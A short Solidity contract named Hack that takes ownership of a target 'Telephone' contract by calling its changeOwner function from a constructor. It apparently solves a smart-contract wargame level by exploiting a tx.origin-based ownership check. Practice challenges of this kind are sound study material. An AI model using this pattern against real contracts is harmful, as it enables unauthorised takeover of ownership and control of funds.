// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address) external;
}

contract Hack {
    constructor(address telephoneContractAddress) {
        ITelephone(telephoneContractAddress).changeOwner(msg.sender);
    }
}